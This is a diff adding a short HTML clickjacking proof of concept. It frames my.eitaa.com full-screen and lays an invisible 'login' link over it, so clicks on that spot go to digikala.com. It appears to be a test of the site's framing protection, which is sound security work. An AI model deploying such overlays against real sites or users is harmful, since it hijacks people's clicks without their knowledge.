@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Clickjacking Test</title>
+
+<style>
+    body{
+        margin:0;
+        overflow:hidden;
+        background:#111;
+    }
+
+    iframe{
+        position:absolute;
+        top:0;
+        left:0;
+        width:100vw;
+        height:100vh;
+        border:none;
+        opacity:1;
+        z-index:1;
+    }
+
+    .header{
+        position:absolute;
+        top:0;
+        left:0;
+        width:100%;
+        height:60px;
+        display:flex;
+        align-items:center;
+        justify-content:flex-start;
+        padding:0 20px;
+        box-sizing:border-box;
+        z-index:2;
+        background:transparent;
+    }
+
+    .header__login{
+        background:transparent;
+        color:transparent;
+        padding:12px 30px;
+        border:none;
+        cursor:pointer;
+        width:100px;
+        height:40px;
+    }
+</style>
+</head>
+
+<body>
+
+<header class="header">
+    <a class="header__login" href="https://digikala.com" target="_blank"></a>
+</header>
+
+<iframe src="https://my.eitaa.com/"></iframe>
+
+</body>
+</html>
